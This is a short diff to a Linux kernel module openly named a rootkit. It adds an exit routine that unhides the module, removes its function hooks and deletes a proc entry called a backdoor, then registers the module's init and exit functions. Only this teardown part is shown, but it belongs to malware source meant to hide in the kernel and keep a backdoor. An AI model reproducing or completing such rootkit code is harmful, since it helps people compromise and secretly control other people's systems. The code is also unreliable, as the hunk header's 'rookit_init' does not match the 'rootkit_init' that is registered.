@@ -372,7 +372,16 @@ static int __init rookit_init(void)
     return 0;
 }
 
+static void __exit rootkit_exit(void)
+{
+    module_show();
+    fh_Remove_hooks(hooks, ARRAY_SIZE(hooks));
+    proc_remove(backdoor_proc_entry);
+    pr_info("Unloaded cleanly - No issues\n");
+}
 
+module_init(rootkit_init); // Kernel macros that register init
+module_exit(rootkit_exit); // and exit, without this kernel doesn't know what to call on load/unload
 
 
 
